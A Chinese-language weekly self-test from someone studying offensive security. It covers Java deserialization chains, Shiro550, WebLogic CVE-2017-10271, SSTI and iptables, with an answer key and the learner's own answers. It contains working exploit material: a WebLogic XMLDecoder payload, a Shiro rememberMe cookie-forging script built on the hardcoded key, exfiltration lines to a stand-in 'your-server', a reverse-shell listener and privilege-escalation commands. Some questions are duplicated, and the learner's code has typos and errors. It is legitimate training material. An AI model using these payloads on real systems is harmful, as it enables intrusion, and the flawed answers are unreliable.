# 本周学习检测题（第 3 周）

> **本周核心**：CC2/3/4 链 · Shiro550 漏洞 · WebLogic CVE-2017-10271 · SSTI 原理 · 信息泄露类型 · SeedLab 防火墙实验 · CC1-7 总览图  
> **本周实践**：Hdphp(Nginx 临时文件 LFI)、EzOmniProbe(竞态条件+vm逃逸+gconv提权)、Ezff(Fury+OGNL+JShell)

<link rel="stylesheet" href="/asserts/css/test-style.css">
<script src="/asserts/js/test-script.js" defer></script>

---

## 📊 自测打分表

<div class="test-card">
  <div class="test-score"><span>📊 基础分</span><span id="baseScore">81</span><span> / 90</span></div>
  <div class="test-score"><span>⭐ 含附加题</span><span id="totalScore">87</span><span> / 100</span></div>
  <div class="test-score"><span>🏆 评级</span><span id="rating">—</span></div>
  <button class="test-reset" id="resetBtn">🔄 重置</button>
</div>

| 题号 | 题型 | 分值 | 得分 |
|:----:|:----:|:----:|:----:|
| 一.1 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 一.2 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 一.3 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 一.4 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 一.5 | 选择题 | 4 | <input class="test-input" data-max="4" value="4"> |
| 二.1 | 简答题 | 8 | <input class="test-input" data-max="8" value="8"> |
| 二.2 | 简答题 | 8 | <input class="test-input" data-max="8" value="8"> |
| 二.3 | 简答题 | 8 | <input class="test-input" data-max="8" value="8"> 
| 二.4 | 简答题 | 8 | <input class="test-input" data-max="8" value="0"> |
| 二.5 | 简答题 | 8 | <input class="test-input" data-max="8" value="6"> |
| 三.1 | 代码构造题 | 15 | <input class="test-input" data-max="15" value="13"> |
| 三.2 | 代码构造题 | 15 | <input class="test-input" data-max="15" value="12"> |
| 四 | 综合分析题 | 10 | <input class="test-input" data-max="10" value="10"> |
| 五 | 附加题 | 10 | <input class="test-input" data-max="10" data-bonus="true" value="6"> |

<div class="test-summary">
  <h4>📝 自测简记</h4>
  <textarea id="testNotes" rows="2" placeholder="记录丢分题号、需要复盘的知识点..."></textarea>
</div>

---

## 一、选择题（每题4分，共20分）

### 第1题

关于 CC2、CC3、CC4 链的区别，下列说法正确的是？

A. CC2 使用 PriorityQueue 入口，CC3 使用 AnnotationInvocationHandler，CC4 使用 HashMap  
B. CC3 通过 InstantiateTransformer + TrAXFilter 触发 TemplatesImpl 字节码加载  
C. CC2 和 CC4 都依赖 JDK ≤ 8u71 版本限制  
D. CC4 的命令执行方式是 InvokerTransformer 调用 Runtime.exec()

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**
- A ❌ CC2/CC4 都用 PriorityQueue，CC3 可用 PriorityQueue 或 AnnotationInvocationHandler
- B ✅ CC3 核心：InstantiateTransformer 实例化 TrAXFilter → 构造方法调用 TemplatesImpl.newTransformer()
- C ❌ CC2/CC4 无 JDK 版本限制，CC1 有限制
- D ❌ CC4 使用 InstantiateTransformer + TemplatesImpl（同 CC3 尾部），不是 InvokerTransformer

</details>

---

### 第2题

关于 Shiro550 漏洞（CVE-2016-4437），下列说法正确的是？

A. 漏洞原因是 Shiro 使用了 AES-CBC 加密模式，存在 Padding Oracle 攻击  
B. 漏洞触发点在 RememberMe Cookie 的反序列化过程，需要已知 AES 密钥  
C. Shiro550 只能通过 URL 参数传递 Payload，不能通过 Cookie  
D. 修复方案是升级到 Shiro 1.2.5 以上版本

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**
- A ❌ 漏洞原因是默认密钥 + 反序列化，不是 Padding Oracle
- B ✅ 核心：RememberMe Cookie 使用 AES 加密 + 反序列化，默认密钥是硬编码的 `kPH+bIxk5D2deZiIxcaaaA==`
- C ❌ 通过 Cookie 的 `rememberMe` 字段传递
- D ❌ 修复是升级到 1.2.5 以上，并**更换默认密钥**

</details>

---

### 第3题

WebLogic CVE-2017-10271 的漏洞本质是？

A. SQL 注入漏洞  
B. XMLDecoder 反序列化漏洞，通过 XML 标签执行任意命令  
C. 文件上传漏洞  
D. SSRF 漏洞

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**
- A ❌ 不是 SQL 注入
- B ✅ WebLogic WLS Security 组件处理 XML 数据时，使用 XMLDecoder 反序列化，可通过构造恶意 XML 执行任意命令
- C ❌ 不是文件上传
- D ❌ 不是 SSRF

**典型 Payload：**
```xml
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>touch /tmp/success</string></void>
        </array>
        <void method="start"/>
    </void></java>
</work:WorkContext>
```
</details>

---

### 第4题

关于 SSTI（服务端模板注入），下列说法正确的是？

A. SSTI 只会发生在 Python 的 Jinja2 模板引擎中  
B. SSTI 的检测方法是直接输入 `{{7*7}}`如果返回 49 则存在漏洞  
C. 不同模板引擎的 SSTI Payload 可以通用  
D. SSTI 漏洞的本质是模板引擎将用户输入当作代码执行

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：D**

**解析：**
- A ❌ SSTI 发生在各类模板引擎：Jinja2(Python)、Twig(PHP)、FreeMarker(Java)、Thymeleaf(Java) 等
- B ❌ 不同引擎语法不同，`{{7*7}}` 只适用于 Jinja2/Twig 类，Freemarker 是 `${7*7}`
- C ❌ 各引擎语法差异大，不能通用
- D ✅ 核心：模板引擎将用户输入当作模板代码解析执行

</details>

---

### 第5题

在 SeedLab 防火墙实验中，iptables 规则 `iptables -A INPUT -p tcp --dport 80 -j DROP` 的作用是？

A. 允许所有 TCP 80 端口的入站流量  
B. 拒绝所有 TCP 80 端口的入站流量  
C. 允许所有 TCP 80 端口的出站流量  
D. 拒绝所有 TCP 80 端口的出站流量

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**
- `-A INPUT`：追加到 INPUT 链（入站流量）
- `-p tcp --dport 80`：匹配 TCP 协议、目标端口 80
- `-j DROP`：丢弃数据包

作用：拒绝外部访问本机的 Web 服务

</details>

---

## 二、简答题（每题8分，共40分）

### 第1题（Java 反序列化 - CC2/3/4 链）

请填写下表，对比 CC2、CC3、CC4 三条链：

| 对比维度 | CC2 | CC3 | CC4 |
|----------|-----|-----|-----|
| 入口类 | | | |
| 关键 Comparator/Transformer | | | |
| 命令执行方式 | | | |
| JDK 版本限制 | | | |

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：**

| 对比维度 | CC2 | CC3 | CC4 |
|----------|-----|-----|-----|
| 入口类 | PriorityQueue | AnnotationInvocationHandler 或 PriorityQueue | PriorityQueue |
| 关键组件 | TransformingComparator + InvokerTransformer | InstantiateTransformer + TrAXFilter + TemplatesImpl | TransformingComparator + InstantiateTransformer + TrAXFilter |
| 命令执行方式 | InvokerTransformer 反射调用 Runtime.exec() | TemplatesImpl 加载恶意字节码 | 同 CC3 |
| JDK 版本限制 | 无 | 无 | 无 |

</details>

</details>

---

### 第4题

关于 SSTI（服务端模板注入），下列说法正确的是？

A. SSTI 只会发生在 Python 的 Jinja2 模板引擎中  
B. SSTI 的检测方法是直接输入 `{{7*7}}`，如果返回 49 则存在漏洞  
C. 不同模板引擎的 SSTI Payload 可以通用  
D. SSTI 漏洞的本质是模板引擎将用户输入当作代码执行

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：D**

**解析：**
- A ❌ SSTI 发生在各类模板引擎：Jinja2(Python)、Twig(PHP)、FreeMarker(Java)、Thymeleaf(Java) 等
- B ❌ 不同引擎语法不同，`{{7*7}}` 只适用于 Jinja2/Twig 类，Freemarker 是 `${7*7}`
- C ❌ 各引擎语法差异大，不能通用
- D ✅ 核心：模板引擎将用户输入当作模板代码解析执行

</details>

---

### 第5题

在 SeedLab 防火墙实验中，iptables 规则 `iptables -A INPUT -p tcp --dport 80 -j DROP` 的作用是？

A. 允许所有 TCP 80 端口的入站流量  
B. 拒绝所有 TCP 80 端口的入站流量  
C. 允许所有 TCP 80 端口的出站流量  
D. 拒绝所有 TCP 80 端口的出站流量

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：B**

**解析：**
- `-A INPUT`：追加到 INPUT 链（入站流量）
- `-p tcp --dport 80`：匹配 TCP 协议、目标端口 80
- `-j DROP`：丢弃数据包

作用：拒绝外部访问本机的 Web 服务

</details>

---

## 二、简答题（每题8分，共40分）

### 第1题（Java 反序列化 - CC2/3/4 链）

请填写下表，对比 CC2、CC3、CC4 三条链：

| 对比维度 | CC2 | CC3 | CC4 |
|----------|-----|-----|-----|
| 入口类 | | | |
| 关键 Comparator/Transformer | | | |
| 命令执行方式 | | | |
| JDK 版本限制 | | | |

<details>
  <summary><strong>📖 查看答案</strong></summary>

**答案：**

| 对比维度 | CC2 | CC3 | CC4 |
|----------|-----|-----|-----|
| 入口类 | PriorityQueue | AnnotationInvocationHandler 或 PriorityQueue | PriorityQueue |
| 关键组件 | TransformingComparator + InvokerTransformer | InstantiateTransformer + TrAXFilter + TemplatesImpl | TransformingComparator + InstantiateTransformer + TrAXFilter |
| 命令执行方式 | InvokerTransformer 反射调用 Runtime.exec() | TemplatesImpl 加载恶意字节码 | 同 CC3 |
| JDK 版本限制 | 无 | 无 | 无 |

</details>

---

### 第2题（Shiro550）

请简述 Shiro550 漏洞的完整利用流程，包括：
1. 漏洞触发点
2. AES 密钥的来源
3. Payload 构造过程（从命令到 Cookie）
4. 修复方案

<details>
  <summary><strong>📖 查看答案</strong></summary>

**1. 漏洞触发点：**

rememberMe Cookie 的处理流程：Shiro 读取 Cookie → Base64 解码 → AES 解密 → 反序列化

**2. AES 密钥来源：**

Shiro 1.2.4 及以下版本硬编码了默认密钥

**3. Payload 构造流程：**

命令 → ysoserial 生成 Payload → AES 加密 → Base64 编码 → 放入 Cookie

**4. 修复方案：**

- 升级 Shiro 到 1.2.5 以上
- 更换默认密钥，使用自定义强密钥

</details>

---

### 第3题（WebLogic CVE-2017-10271）

请写出：
1. 漏洞影响版本
2. 触发该漏洞的 HTTP 请求路径
3. 一个可执行命令的恶意 XML Payload 结构
4. 漏洞原理简述

<details>
  <summary><strong>📖 查看答案</strong></summary>

**1. 影响版本：**

WebLogic 10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1

**2. 请求路径：**

`/wls-wsat/CoordinatorPortType` 等

**3. 恶意 XML Payload：**

```xml
<work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
    <java><void class="java.lang.ProcessBuilder">
        <array class="java.lang.String" length="3">
            <void index="0"><string>/bin/bash</string></void>
            <void index="1"><string>-c</string></void>
            <void index="2"><string>touch /tmp/success</string></void>
        </array>
        <void method="start"/>
    </void></java>
</work:WorkContext>
```
**4. 漏洞原理：** 

XMLDecoder 反序列化用户传入的 XML 数据，可实例化任意 Java 对象执行命令

</details>

### 第4题（SSTI + 信息泄露）

请回答：
1. SSTI 是什么？列出至少 3 种常见模板引擎及其基本 Payload 语法。
2. 本周了解的信息泄露类型有哪些？请列出至少 4 种并说明泄露什么信息。

<details>
  <summary><strong>📖 查看答案</strong></summary>

**1. SSTI（服务端模板注入）：**

用户输入被模板引擎作为代码执行。

| 模板引擎 | 语言 | 基础 Payload |
|----------|------|--------------|
| Jinja2 | Python | `{{7*7}}` |
| Twig | PHP | `{{7*7}}` |
| FreeMarker | Java | `${7*7}` |

**2. 信息泄露类型：**

| 类型 | 泄露内容 |
|------|----------|
| .git 泄露 | 源码、配置 |
| .env 泄露 | 数据库密码、API密钥 |
| Swagger 泄露 | API 接口列表 |
| JS 接口泄露 | 隐藏接口 |

</details>

---

### 第5题（SeedLab 防火墙实验 + CC1-7 总览）

请回答：
1. iptables 的 INPUT、OUTPUT、FORWARD 三个链分别控制什么流量？
2. 写出拒绝来自 192.168.1.100 的 ICMP 请求的 iptables 命令。
3. CC1-7 中，哪几条链使用了 TemplatesImpl 字节码加载？哪几条使用了 InvokerTransformer + Runtime.exec()？

<details>
  <summary><strong>📖 查看答案</strong></summary>

**1. iptables 三链作用：**

| 链 | 作用 |
|----|------|
| INPUT | 入站流量 |
| OUTPUT | 出站流量 |
| FORWARD | 转发流量 |

**2. 拒绝 ICMP 请求：**

```bash
iptables -A INPUT -s 192.168.1.100 -p icmp -j DROP
```

**3. CC1-7 分类：**

命令执行方式	                            CC 链
TemplatesImpl 字节码加载	                CC3、CC4
InvokerTransformer + Runtime.exec()	       CC1、CC5、CC6、CC7

</details>

## 三、代码/构造题（每题15分，共30分）

### 第1题（Shiro550 Payload 构造）

假设你已知目标 Shiro 使用默认密钥，请完成：

1. 写出使用 ysoserial 生成 CommonsBeanutils1 链 Payload 的命令（3分）
2. 写出 Python 代码片段，完成 AES 加密 + Base64 编码（6分）
3. 写出完整的请求构造（curl 命令）（3分）
4. 无回显时如何确认命令执行？（3分）

<details>
  <summary><strong>📖 查看答案</strong></summary>

**1. 生成 Payload：**

```bash
java -jar ysoserial.jar CommonsBeanutils1 "curl http://your-server/shell.jsp" > payload.ser
```
**2. Python 加密脚本：**
```python
from Crypto.Cipher import AES
import base64

key = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
iv = b'\x00' * 16

with open("payload.ser", "rb") as f:
    data = f.read()

pad = 16 - (len(data) % 16)
data += bytes([pad]) * pad

cipher = AES.new(key, AES.MODE_CBC, iv)
encrypted = cipher.encrypt(data)
cookie = base64.b64encode(encrypted).decode()
print(f"rememberMe={cookie}")
```
**3. 发送请求：**

```bash
curl -H "Cookie: rememberMe=xxx" http://target/login
```
**4. 无回显确认方法：**

DNS 外带：curl http://dnslog.cn/$(whoami)

HTTP 外带：curl http://your-server/$(id|base64)

时间延迟：ping -c 5 127.0.0.1

写文件：touch /tmp/success

</details>

### 第2题（CC 链调用图 + 防火墙规则）

**任务 1（6分）：** 画出 CC3 链的完整调用链路图

**任务 2（6分）：** 写出阻止外部访问本机 22 端口但允许本机主动发起 SSH 连接的 iptables 规则

**任务 3（3分）：** 为什么 Shiro550 中使用 CommonsBeanutils1 链更稳定？

<details>
  <summary><strong>📖 查看答案</strong></summary>

**任务 1：CC3 调用链路图**

```text
AnnotationInvocationHandler.readObject()
    ↓
memberValues.entrySet()
    ↓
LazyMap.get()
    ↓
factory.transform()
    ↓
ConstantTransformer.transform() → TrAXFilter.class
    ↓
InstantiateTransformer.transform()
    ↓
TrAXFilter 构造方法
    ↓
TemplatesImpl.newTransformer()
    ↓
defineTransletClasses()
    ↓
加载 _bytecodes 中的恶意类
    ↓
恶意类静态代码块
    ↓
RCE
```
**任务 2：iptables 规则**

```bash
iptables -A INPUT -p tcp --dport 22 -j DROP
iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
```
**任务 3：CommonsBeanutils1 更稳定**

不依赖动态代理，兼容性更好

无 JDK 版本限制

Shiro 环境中 commons-beanutils 常作为间接依赖存在

</details>

## 四、综合分析题（10分）
场景： 某目标存在 Shiro 1.2.4（默认密钥）、WebLogic 10.3.6（未修复）、LFI 漏洞。
任务：
优先选择哪个漏洞？为什么？（2分）
写出完整攻击步骤（4分）
低权限 shell 如何提权？（2种方法）（2分）
如何通过防火墙规则判断开放端口？（2分）

<details> <summary><strong>📖 查看答案</strong></summary>

1. 优先选择：Shiro550
原因：利用成熟、默认密钥已知、Cookie 方式不易被拦截
2. 攻击步骤：
    ```text
    1. 访问 /login 确认 rememberMe 功能
    2. ysoserial 生成反弹 shell Payload
    3. 用默认密钥加密生成 Cookie
    4. 发送请求 curl -H "Cookie: rememberMe=xxx" http://target/login
    5. 攻击机监听 nc -lvnp 4444 获取 shell
    ```
3. 提权方法：
    sudo 提权：sudo -l 查看可执行命令
    SUID 提权：find / -perm -4000 -type f 查找 SUID 文件
4. 判断开放端口：
    ```bash
    netstat -tlnp
    ss -tlnp
    iptables -L -n -v
    ```

</details>

## 五、附加题（挑战，10分）
从依赖条件、JDK 版本限制、命令执行方式、利用稳定性四个维度对比 CC1、CC3、CC6。JDK 11 且 Runtime 被限制时应选哪条链？如何实现 RCE？

<details> <summary><strong>📖 查看答案</strong></summary>

1. 三维度对比：
    维度	CC1	    CC3	    CC6
    依赖	commons-collections	commons-collections + xalan	commons-collections
    JDK限制	≤ 8u71	 无	     无
    命令执行Runtime.exec()	字节码加载	Runtime.exec()
    稳定性	低	    中	     高
2. JDK 11 + Runtime 被限制时选择：CC3
    原因：不依赖 Runtime.exec()，通过 TemplatesImpl 加载字节码

3. 实现 RCE：
    构造恶意字节码，在静态代码块中使用 ProcessBuilder 执行命令
    ```java
    public class Evil {
        static {
            try {
                new ProcessBuilder("bash", "-c", "反弹Shell命令").start();
            } catch (Exception e) {}
        }
    }
    ```
</details>

📌 附录：本周知识点速查
类别	            核心知识点
Java 反序列化	    CC2/3/4 链、PriorityQueue、TemplatesImpl
Shiro550	        默认密钥、AES-CBC、rememberMe Cookie
WebLogic	        XMLDecoder 反序列化
SSTI	            模板引擎类型、检测方法
信息泄露	        .git、.env、Swagger
防火墙	            iptables INPUT/OUTPUT/FORWARD
提权	            sudo、SUID



## 答题区
### 选择题
1. B
2. B
3. B
4. D
5. B
### 简答题
1. 
| 对比维度 | CC2 | CC3 | CC4 |
|----------|-----|-----|-----|
| 入口类 | PriorityQueue | AnnotationInvocationHandler 或 PriorityQueue | PriorityQueue |
| 关键组件 | TransformingComparator + InvokerTransformer | InstantiateTransformer + TrAXFilter + TemplatesImpl | TransformingComparator + InstantiateTransformer + TrAXFilter |
| 命令执行方式 | InvokerTransformer 反射调用 Runtime.exec() | TemplatesImpl 加载恶意字节码 | 同 CC3 |
| JDK 版本限制 | 无 | 无 | 无 |

---

2. 完整利用流程
   1. 触发点：rememberMe字段，单引号登录时勾选remember me时请求头的Cookie字段会携带rememberMe参数，服务端检查到cookie携带rememberMe会对其进行处理，先进行base64解码然后AES解密，然后对解密后的序列化数据进行反序列化从而触发反序列化漏洞
   2. Shiro 1.2.4 及以下版本硬编码了默认密钥 
   3. Payload 构造过程
      ```
      利用CB1链生成恶意序列化数据（ysoserial工具或手工编写POC生成）
      |
      用秘钥对恶意序列化数据进行AES加密（python脚本）
      |
      将加密后的数据进行base64编码
      |
      将生成的payload填入rememberMe的值中
      ``` 
   4. 将shiro升级到1.2.5版本，更换默认秘钥
3. 第三题
   1. 漏洞影响版本：10.3.6.0、12.1.3.0、12.2.1.0、12.2.1.1
   2. 触发该漏洞的 HTTP 请求路径：/wls-wsat/CoordinatorPortType
   3. 一个可执行命令的恶意 XML Payload结构：
      ```xml
      <soapenv:Envelope xmlns="">
        <soapenv:Header>
            <work:WorkContext xmlns="">
                <java>
                    <void class="java.lang.Runtime">
                        <array class="java.labg.String" length="2">
                            <void index="0">
                                <string>ls</string>
                            </void>
                            <void index="1">
                                <string>-la</string>
                            </void>
                        </array>
                        <void cmethod="start"/>
                    </void>
                </java>
            </work:WorkContext>
        </soapenv:Header>
        <soapenv:Body/>
      </soapenv:Envelope>
      ``` 
   4. 漏洞原理：weblogic的XMLDecoder解析器直接将用户输入的xml数据解析成java对象而没有进行过滤，从而使用户能够通过xml标签构造任意类调用任意方法
4. SSTI + 信息泄露
5. SeedLab 防火墙实验 + CC1-7 总览
   1. 入站，出站，转发
   2. iptables -A INPUT -p icmp  -s 192.168.1.100 -j DROP 
   3. CC2,3,4;CC1,5,6,7
### 代码构造
1. Shiro550 Payload 构造
   1. `java -jar ysoserial.jar CommonsBeanutils1 "touch /tmp/hello" >payload.ser`
   2. 写出 Python 代码片段，完成 AES 加密 + Base64 编码
      ```python
      import base64
      From Ctypto.Ciper import AES
      import uuid
      FILEPATH="..."
      KEY="..."
      BS=AES.block_size
      with open(FILEPATH,'rb') as f:
        data=f.read()
      def pad(data):
        lengthpad=BS-len(data)%BS
        padding_data=lengthpad*bytes([lengthpad])
        padData=data+ padding_data
        return padData
      key=base64.b64decode(KEY)
      iv =uuid.uuid4().bytes
      pad_data=pad(data)
      cipher=new AES(key,MODE_CBC,iv)
      cryptedData=cipher.encrypt(pad_data)
      encoded_data=base64.b64encode(iv+cryptedData)
      print(f"rememberMe={encoded_data}")
      ``` 
   3. 写出完整的请求构造（curl 命令）
      ```bash
        curl -X POST -H "Cookie:rememberMe=payload" http://...
      ``` 
   4. 无回显时如何确认命令执行：DNS外带技术，将执行的命令改为ping 攻击者域名
2. CC 链调用图 + 防火墙规则
   1. CC3 链的完整调用链路图
      ```java
      AnnotationInvocationHandler.readObject()
      |
      ProxyMap.entrySet()
      |
      LazyMap.invoke()
      |
      LazyMap.get()
      |
      ChainedTransformer.transform()
      |
      ConstantTransformer.transform()
      |
      InstantiateTransformer.transform()
      |
      TrAXFilter
      |
      TemplatesImpl.newTransformer()
      |
      TemplatesImpl.getTransletInstance()
      |
      TemplatesImpl.defineTransletClasses()
      |
      TransletClassLoader.defineclass()
      |
      加载恶意字节码
      |
      RCE
      ```` 
   2. 写出阻止外部访问本机 22 端口但允许本机主动发起 SSH 连接的 iptables 规则
      ```bash
      iptables -A INPUT -p tcp --dport 22 -j DROP
      iptables -A OUTPUT -p tcp --sport 22 -j ACCEPT
      ``` 
   3. 为什么 Shiro550 中使用 CommonsBeanutils1 链更稳定：不依赖动态代理，无jdk版本限制
### 综合分析
1. 选择shiro1.2.4，不易被拦截
2. 攻击步骤
   ```
   在攻击机上开启nc监听
   |
   生成执行反弹shell命令的序列化数据
   |
   对数据进行AES加密然后base64编码
   |
   将rememberMe的值替换为payload发送给服务端
   |
   获得shell
   ```  
3. 提权方式
   1. sudo提权`sudo -l`
   2. suid提权`find / -type f -perm -4000 2>/dev/null`
4. 通过防火墙规则判断端口开放情况
   ```
   iptables -L -n -v
   netstat -tlnp
   ``` 
### 附加
维度	CC1	    CC3	    CC6
依赖	commons-collections	commons-collections + xalan	commons-collections
JDK限制	≤ 8u71	 无	     无
命令执行Runtime.exec()	字节码加载	Runtime.exec()
稳定性	低	    中	     高
选择CC6,CC1和CC3都依赖AnnotationInvocationHandler类，该类对jdk版本有要求，必须是<=jdk8u71,使用ProcessBuilder类或者尝试使用ognl表达式注入，或者采用加载恶意字节码


## 巩固
### iptables规则：有状态的防火墙
写出阻止外部访问本机 22 端口但允许本机主动发起 SSH 连接的 iptables 规则：使用有状态的防火墙
```
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -j DROP
iptables -A INPUT -p tcp --dport 22 -m state --state ESTABLISHED -j ACCEPT
iptables -A OUTPUT -p tcp --sport 22 -m state --state ESTABLISHED -j ACCEPT
```
### SSTI常见的模版引擎
1. Jinja   python   {{7*7}}
2. Twing   php      {{7*7}}
3. FreeMaker Java   ${7*7}
### 信息泄露的方式
1.  .git   泄露配置源码
2.  .env   泄露数据库密码，API秘钥
3.  robots.txt文件 泄露路径
4.  Swagger   泄露API接口列表
5.  js接口泄露
6.  开发者注释


### 丢分复盘提醒：

简答第4题 (SSTI)：完全空白，这是基础题，需要立刻补上。

iptables命令：混淆了--sport (源端口) 和 --dport (目标端口) 的方向，以及INPUT/OUTPUT链在不同场景下的配合。

附加题审题：在Runtime被限制且JDK 11的环境下，应优先考虑基于TemplatesImpl字节码加载的链(如CC3/CC4)，而不是依赖反射调用Runtime的链(如CC6)